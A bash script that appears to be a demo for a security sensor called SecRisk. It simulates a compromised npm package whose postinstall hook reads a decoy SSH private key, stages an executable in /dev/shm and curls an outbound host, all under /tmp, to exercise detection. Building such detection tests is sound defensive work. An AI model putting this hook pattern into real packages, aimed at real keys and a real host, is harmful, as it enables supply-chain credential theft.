#!/usr/bin/env bash
# SecRisk demo: simulated malicious npm postinstall.
#
# Run this in a SECOND terminal while the sensor is running in the first.
# Everything happens under /tmp/secrisk-demo — no real credentials are read and
# nothing outside that directory is touched.
#
# The chain it produces, and the sensor that catches each step:
#   1. exec    npm-install.sh -> sh -> postinstall.sh   (process sensor, ppid lineage)
#   2. file    reads .../\.ssh/id_rsa                   (file sensor, reason=secret_read)
#   3. file    writes /dev/shm/.update-cache            (file sensor, staging path)
#   4. exec    curl                                     (process sensor)
#   5. net     outbound TCP connect                     (network sensor)
# All five share one pid lineage — that link is what the correlation engine
# will consume in Phase 3.

set -u

DEMO_DIR=/tmp/secrisk-demo
PKG_DIR="$DEMO_DIR/node_modules/left-pad"
FAKE_HOME="$DEMO_DIR/home"
STAGED=/dev/shm/.update-cache
EXFIL_HOST="${EXFIL_HOST:-example.com}"

cleanup() {
    rm -rf "$DEMO_DIR" "$STAGED"
}

# --- Set up the fake compromised package -----------------------------------
cleanup
mkdir -p "$PKG_DIR" "$FAKE_HOME/.ssh"

# A decoy private key. Suffix `id_rsa` is what the file sensor watchlists.
cat > "$FAKE_HOME/.ssh/id_rsa" <<'KEY'
-----BEGIN OPENSSH PRIVATE KEY-----
NOT-A-REAL-KEY-THIS-IS-SECRISK-DEMO-DECOY-DATA
-----END OPENSSH PRIVATE KEY-----
KEY
chmod 600 "$FAKE_HOME/.ssh/id_rsa"

# The malicious postinstall hook — the payload of the "compromised" package.
cat > "$PKG_DIR/postinstall.sh" <<PAYLOAD
#!/bin/sh
# Step 2: read the developer's SSH private key  -> file/secret_read
cat "$FAKE_HOME/.ssh/id_rsa" > /dev/null

# Step 3: stage a payload in shared memory      -> file/write
echo "staged-implant-bytes" > "$STAGED"
chmod +x "$STAGED"

# Steps 4+5: exec curl, which connects outbound -> exec + net
curl -s -o /dev/null --max-time 5 "http://$EXFIL_HOST/" || true
PAYLOAD
chmod +x "$PKG_DIR/postinstall.sh"

# The "package manager" that invokes the hook — gives us the top of the chain.
cat > "$DEMO_DIR/npm-install.sh" <<'INSTALLER'
#!/bin/sh
echo "  added 1 package in 0.4s"
sh "$1"
INSTALLER
chmod +x "$DEMO_DIR/npm-install.sh"

# --- Run it ----------------------------------------------------------------
echo "[*] Simulating: npm install left-pad  (with compromised postinstall)"
echo "[*] Watch the sensor terminal for the exec -> secret_read -> write -> net chain."
echo

"$DEMO_DIR/npm-install.sh" "$PKG_DIR/postinstall.sh"

echo
echo "[*] Done. Chain complete."
echo "[*] Cleaning up $DEMO_DIR and $STAGED"
cleanup
